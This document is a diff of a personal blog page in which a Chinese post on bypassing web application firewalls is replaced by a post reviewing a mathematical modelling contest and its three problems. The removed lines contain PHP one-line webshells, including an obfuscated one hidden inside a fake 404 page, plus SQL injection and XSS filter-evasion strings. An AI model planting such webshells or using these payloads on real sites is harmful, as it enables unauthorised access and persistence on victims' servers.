@@ -77,7 +77,7 @@
 <link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="waf,xss,sql," />
+  <meta name="keywords" content="Hexo, NexT" />
 
 
 
@@ -93,17 +93,19 @@
 
 
 
-<meta name="description" content="一句话 bypass_waf听学长说现在web很多都要花式bypass waf刚好才理解一点一句话木马 看到一篇升级版一句话即关于其无特征bupass waf的文章 先记录下来">
-<meta name="keywords" content="waf,xss,sql">
+<meta name="description" content="第一次参赛，啥都不会没弃赛感觉已经可以了。">
+<meta name="keywords">
 <meta property="og:type" content="article">
-<meta property="og:title" content="bypass_waf">
-<meta property="og:url" content="http://Merl1ng.com/2017/07/20/bypass_waf/index.html">
+<meta property="og:title" content="小美赛总结">
+<meta property="og:url" content="http://Merl1ng.com/2017/12/06/小美赛总结/index.html">
 <meta property="og:site_name" content="Merl1ng's blog">
-<meta property="og:description" content="一句话 bypass_waf听学长说现在web很多都要花式bypass waf刚好才理解一点一句话木马 看到一篇升级版一句话即关于其无特征bupass waf的文章 先记录下来">
-<meta property="og:updated_time" content="2017-07-26T05:08:52.631Z">
+<meta property="og:description" content="第一次参赛，啥都不会没弃赛感觉已经可以了。">
+<meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/%E5%BB%BA%E6%A8%A1haha.PNG">
+<meta property="og:updated_time" content="2017-12-10T10:56:43.710Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="bypass_waf">
-<meta name="twitter:description" content="一句话 bypass_waf听学长说现在web很多都要花式bypass waf刚好才理解一点一句话木马 看到一篇升级版一句话即关于其无特征bupass waf的文章 先记录下来">
+<meta name="twitter:title" content="小美赛总结">
+<meta name="twitter:description" content="第一次参赛，啥都不会没弃赛感觉已经可以了。">
+<meta name="twitter:image" content="http://otvzfr1o1.bkt.clouddn.com/%E5%BB%BA%E6%A8%A1haha.PNG">
 
 
 
@@ -131,13 +133,13 @@
 
 
 
-  <link rel="canonical" href="http://Merl1ng.com/2017/07/20/bypass_waf/"/>
+  <link rel="canonical" href="http://Merl1ng.com/2017/12/06/小美赛总结/"/>
 
 
 
 
 
-  <title>bypass_waf | Merl1ng's blog</title>
+  <title>小美赛总结 | Merl1ng's blog</title>
   
 
 
@@ -266,7 +268,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://Merl1ng.com/2017/07/20/bypass_waf/">
+    <link itemprop="mainEntityOfPage" href="http://Merl1ng.com/2017/12/06/小美赛总结/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Merl1ng">
@@ -283,7 +285,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">bypass_waf</h1>
+          <h1 class="post-title" itemprop="name headline">小美赛总结</h1>
         
 
         <div class="post-meta">
@@ -295,8 +297,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-07-20T21:44:22+08:00">
-                2017-07-20
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-06T13:17:36+08:00">
+                2017-12-06
               </time>
             
 
@@ -305,28 +307,6 @@
             
           </span>
 
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/" itemprop="url" rel="index">
-                    <span itemprop="name">web</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
           
 
           
@@ -352,16 +332,15 @@
       
 
       
-        <h3 id="一句话-bypass-waf"><a href="#一句话-bypass-waf" class="headerlink" title="一句话 bypass_waf"></a>一句话 bypass_waf</h3><p>听学长说现在web很多都要花式bypass waf<br>刚好才理解一点一句话木马 看到一篇升级版一句话<br>即关于其无特征bupass waf的文章 先记录下来<br><a id="more"></a><br>（也看到了一篇sql和xss绕waf的 挺不错的 记录在下面）</p>
-<p>姿势一 php动态函数 （无eval）<br><code>&lt;?php $_POST[&#39;xx&#39;]($_POST[&#39;oo&#39;]);?&gt;</code><br>利用 在hackbar Post data<br>写入xx=assert￥oo=QAQ</p>
-<p>姿势二 无Post<br>getallheaders函数能够获取请求头内容<br><code>&lt;?php eval(getallheaders()[&#39;Accept-Language&#39;]);&gt;</code><br>结合姿势一<br><code>&lt;?php $a=getallheaders()[&#39;xxx&#39;];$a(getallheaders()[&#39;ooo&#39;]);&gt;</code></p>
-<p>姿势三 遇到会检测http请求头内容的waf<br><code>&lt;?php eval(gzuncompress(base64_decode(getallheaders()[&#39;xx&#39;])));&gt;</code><br>解开之后发现是乱码，waf识别不出来里面的内容<br>结合姿势一<br><code>&lt;?php $xx=gzuncompress(base64_decode(getallheaders()[&#39;xx&#39;]));$xx(gzuncompress(base64_decode(getallheaders()[&#39;oo&#39;])));&gt;</code></p>
-<p>姿势四 防止管理员删shell&gt;伪装成404</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">"-//IETF//DTD HTML 2.0//EN"</span>&gt;</div><div class="line">&lt;html&gt;&lt;head&gt;</div><div class="line">&lt;title&gt;404 Not Found&lt;/title&gt;</div><div class="line">&lt;/head&gt;&lt;body&gt;</div><div class="line">&lt;h1&gt;Not Found&lt;/h1&gt;</div><div class="line">&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;</div><div class="line"> </div><div class="line">...</div><div class="line"> </div><div class="line">&lt;?php</div><div class="line"><span class="variable">$xx</span>=getallheaders()[<span class="string">'xx'</span>];</div><div class="line"><span class="variable">$oo</span>=getallheaders()[<span class="string">'oo'</span>];</div><div class="line"><span class="keyword">if</span>(<span class="variable">$xx</span>!=<span class="string">""</span> and <span class="variable">$oo</span>!=<span class="string">""</span>)&#123;</div><div class="line">  <span class="variable">$xx</span>=gzuncompress(base64_decode(<span class="variable">$xx</span>));<span class="variable">$xx</span>(gzuncompress(base64_decode(<span class="variable">$oo</span>)));</div><div class="line">&#125;</div><div class="line">&gt;</div><div class="line">&lt;/body&gt;&lt;/html&gt;</div></pre></td></tr></table></figure>
-<h3 id="SQL-XSS-bypass-waf"><a href="#SQL-XSS-bypass-waf" class="headerlink" title="SQL XSS bypass waf"></a>SQL XSS bypass waf</h3><p>姿势一 大小写转换<br>SQL：<code>sEleCt vERsIoN()</code><br>XSS：<code>&lt;sCrIpt&gt;aleRt(1)&lt;/scrIpt&gt;</code></p>
-<p>姿势二 字符编码<br>SQL：<code>load_file(0x633A2F77696E646F77732F6D792E696E69)</code><br>XSS：<code>&lt;script%20src%3D&quot;http%3A%2F%2F0300.0250.0000.0001&quot;&gt;&lt;%2Fscript&gt;</code></p>
-<p>姿势三 拼凑法 其只验证一次<br>SQL：<code>selselectect verversionsion();</code><br>XSS：<code>&lt;scr&lt;script&gt;rip&gt;alalertert&lt;/scr&lt;/script&gt;rip&gt;</code></p>
-<p>姿势四 干扰字符污染法：<br>空字符 空格 TAB换行 注释 特殊的函数等等都可以<br>SQL：<code>sEleCt+1-1+vERsIoN   /*!*/       ();</code></p>
+        <p>第一次参赛，啥都不会没弃赛感觉已经可以了。<br><a id="more"></a></p>
+<p>先贴一发最后结束时的桌面<br><img src="http://otvzfr1o1.bkt.clouddn.com/%E5%BB%BA%E6%A8%A1haha.PNG" alt=""></p>
+<h3 id="赛题回顾"><a href="#赛题回顾" class="headerlink" title="赛题回顾"></a>赛题回顾</h3><p>原题都是英文 直接贴翻译过后的题目吧</p>
+<h4 id="问题A-MCM-飓风和全球变暖"><a href="#问题A-MCM-飓风和全球变暖" class="headerlink" title="问题A(MCM):飓风和全球变暖"></a>问题A(MCM):飓风和全球变暖</h4><p>飓风(也包括在西北太平洋地区被称为台风的风暴和印度洋和西南太平洋的热带气旋)是极具破坏性的，常常导致数百人死亡，有时甚至数千人死亡。许多气象学家一致认为，在过去几十年里，全球变暖已经发生在地球表面(约半摄氏度)，而且这种趋势很可能会持续下去。问题是，全球变暖对飓风活动意味着什么?请构建一个合理的模型，测量全球变暖的程度和全球飓风活动的强度，并估计它们之间的关系。</p>
+<h4 id="问题B-MCM-电子邮件笔迹分析"><a href="#问题B-MCM-电子邮件笔迹分析" class="headerlink" title="问题B(MCM):电子邮件笔迹分析"></a>问题B(MCM):电子邮件笔迹分析</h4><p>笔迹分析是一种非常特殊的调查形式，用于将人们与书面证据联系起来。笔迹调查人员通常被要求在法庭或刑事调查中，以确定书面样本是否来自某个特定的人。由于许多语言证据现在都出现在电子邮件中，从广义上说，笔迹分析也包括了如何通过电子邮件的语言特征来识别作者的问题。作者身份归属是指语言学家通过使用可识别的语言风格特征识别出有争议的文本的作者(s)的过程，从词频到更喜欢的句法结构。电子邮件的内容往往很短，作者的语言风格也很明显。<br>请构建一个有效的模型，通过捕获电子邮件的语言特征来识别作者。<br>你可以使用安然邮件数据集来训练和测试你的模型。<br>安然公司电子邮件数据集链接:<br><a href="http://bailando.sims.berkeley.edu/enron_Email.html" target="_blank" rel="external">http://bailando.sims.berkeley.edu/enron_Email.html</a></p>
+<h4 id="问题C-ICM-如何打击人口贩运"><a href="#问题C-ICM-如何打击人口贩运" class="headerlink" title="问题C(ICM):如何打击人口贩运"></a>问题C(ICM):如何打击人口贩运</h4><p>7月30日是联合国世界反人口贩运日，这一天的重点是结束对儿童、妇女和男性的强制劳动或性劳动的刑事剥削。<br>全世界有27到458万的人被困在某种形式的现代奴役中。<br>受害者被迫成为性工作者、乞丐和儿童兵，或在制造业、建筑、采矿、商业捕鱼等行业的家政工人、工厂工人和劳工。<br>人口贩运发生在世界上的每个国家，包括美国，这是一个利润丰厚的行业，每年非法盈利的年产值估计高达1500亿美元。<br>事实上，它是全球有组织犯罪的最大利润来源之一，仅次于非法毒品。<br>世界上几乎每一个国家都受到人口贩运的影响，作为起点、中转或目的地，据报道，至少有127个国家的受害者在137个国家被剥削。<br>人口贩卖是欧洲最赚钱的非法生意之一，犯罪集团每年从它那里赚了30亿美元，这使它成为一个相当大的犯罪集团，它是世界上最边缘化的人。<br>在欧洲，超过14万的受害者被困在性剥削的暴力和堕落的环境中，多达七分之一的性工作者可能通过贩卖卖淫被奴役。<br>在全球范围内，人口贩卖的受害者中有五分之一是儿童，尽管在非洲和大湄公河等贫穷地区和地区，他们占了大多数人口贩卖的人口。<br>与此同时，妇女占世界人口贩运受害者的三分之二。<br>从本质上讲，人口贩卖是一个供应链。<br>捐助者(维克-1 tims)通过人口贩卖网络满足了需求(廉价和脆弱的非法劳动)。<br>尽管他们努力在电网和阴影下运行，但他们还是留下了一条数据线索，不管这些数据是多么的微弱或支离破碎。<br>数据分析的数学搜索，可以帮助执法部门打击人口贩卖。<br>假设您的ICM团队受雇于UNODC，通过建立数学模型来打击人口贩卖。<br>您的ICM团队的任务是:<br>1。发现危险人群。贩卖人口往往以欺诈的方式开始，比如雇佣或浪漫的承诺。数据可以帮助确定特定的经济萧条地区，在那里我们可以确定最危险的人群，以及针对这些人群的预防活动。被卷入人口贩运的风险因素包括贫困、失业、移民和逃避政治冲突或战争。<br>2。受害者身份和位置。<br>人口贩运网络是动态的。贩毒者很可能会频繁地改变分布和运输路线，以避免被发现，这使得执法人员和分析人员在试图识别和摧毁人口贩卖网络的过程中，信息不完整。然而，研究人员可以通过跟踪不同位置的数据的细微趋势来帮助他们;在接触点，我们和受害者接触，比如急诊室;以及当地执法部门的活动。<br>例如，在性交易中，可以通过从零售商店购买交易数据来寻找线索。受害者有时会偷取一些人贩子可能无法提供的基本用品，比如女性卫生用品、肥皂和牙膏。我们可以从小偷小偷中得到一些线索。<br>使用现金进行交易的趋势，通常是用借记卡或信用卡来预订的，这也可能会增加一个危险信号。特别是性交易活动，在互联网的公共区域留下痕迹，主要是广告和陪护广告。广告商倾向于使用社交网络和交友网站，而更精通的人贩子经常会改变他们的网络存在，以躲避身份识别。通过数据挖掘，研究人员可以根据用户行为在不同的社交网络上定位用户，即使他们的用户名和信息不一样。<br>建立网络信息之间的联系可以帮助我们锁定贸易商的地位。<br>人们还知道，贩毒者利用在大型活动中对商业性剥削的需求增加，包括大会和大型体育赛事。分析了在线广告的位置和时间，可以帮助执法人员发现并可能阻断受害者的交通。<br>3。网络中断。<br>阻断人口流动、资金和其他人口贩运的要素对识别人口贩运网络至关重要，破坏他们在源头的基础设施并消除他们。不幸的是，网络中断需要有关当局和公众的合作。在一些国家，如尼泊尔和哥斯达黎加，官员们受到威胁或贿赂，以忽视或允许人类的“背叛”。对于使用被贩卖的劳工的行业，监管往往不够完善。贩毒者可以很容易地制造或修改受害者的身份证件，使他们无法看到负担过重的当局。为了帮助当局确定人口贩运的目标，研究人员可以求助于网络分析，这是一种描述真实世界系统及其相互作用的数学方法。<br>例如，网络分析被用来描绘用户的动态，以及他们在社交网络中嵌入的连接，比如Facebook和Twitter。这可能会识别风险人群，或者，也可能是贩毒者或顾客。社交网络分析还可以帮助确定哪些联系人对其他人有重要影响。这可能使早期识别受害者或交易交易。</p>
+<p>References<br>[1] <a href="http://www.unodc.org/unodc/human-trafficking/" target="_blank" rel="external">http://www.unodc.org/unodc/human-trafficking/</a><br>[2] <a href="http://humantraffickinghotline.org/" target="_blank" rel="external">http://humantraffickinghotline.org/</a><br>[3] <a href="https://www.fbi.gov/wanted/human-trafficking/" target="_blank" rel="external">https://www.fbi.gov/wanted/human-trafficking/</a><br>[4] <a href="https://www.solidaritycenter.org/what-we-do/migration-andhuman-trafficking/" target="_blank" rel="external">https://www.solidaritycenter.org/what-we-do/migration-andhuman-trafficking/</a> </p>
+<h3 id="选题"><a href="#选题" class="headerlink" title="选题"></a>选题</h3><p>第一次参赛选题蛮纠结的，一开始看出B题是机器学习首先排除了，在A与C之间选择。C题虽然贼长但是抱着题目越长题</p>
+<p>越简单的心态还是认真读了好久，结果。。还是看不懂，所以排除法告诉我们选A</p>
 
       
     </div>
@@ -389,16 +368,6 @@
 
     <footer class="post-footer">
       
-        <div class="post-tags">
-          
-            <a href="/tags/waf/" rel="tag"><i class="fa fa-tag"></i> waf</a>
-          
-            <a href="/tags/xss/" rel="tag"><i class="fa fa-tag"></i> xss</a>
-          
-            <a href="/tags/sql/" rel="tag"><i class="fa fa-tag"></i> sql</a>
-          
-        </div>
-      
 
       
       
@@ -408,18 +377,14 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/07/23/xss基础笔记/" rel="next" title="xss基础笔记">
-                <i class="fa fa-chevron-left"></i> xss基础笔记
-              </a>
-            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/07/18/一句话木马和中国菜刀/" rel="prev" title="一句话木马和中国菜刀">
-                一句话木马和中国菜刀 <i class="fa fa-chevron-right"></i>
+              <a href="/2017/11/24/MCTF后两期writeup/" rel="prev" title="MCTF后两期writeup">
+                MCTF后两期writeup <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -570,7 +535,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#一句话-bypass-waf"><span class="nav-number">1.</span> <span class="nav-text">一句话 bypass_waf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL-XSS-bypass-waf"><span class="nav-number">2.</span> <span class="nav-text">SQL XSS bypass waf</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#赛题回顾"><span class="nav-number">1.</span> <span class="nav-text">赛题回顾</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#问题A-MCM-飓风和全球变暖"><span class="nav-number">1.1.</span> <span class="nav-text">问题A(MCM):飓风和全球变暖</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#问题B-MCM-电子邮件笔迹分析"><span class="nav-number">1.2.</span> <span class="nav-text">问题B(MCM):电子邮件笔迹分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#问题C-ICM-如何打击人口贩运"><span class="nav-number">1.3.</span> <span class="nav-text">问题C(ICM):如何打击人口贩运</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#选题"><span class="nav-number">2.</span> <span class="nav-text">选题</span></a></li></ol></div>
             
 
           </div>
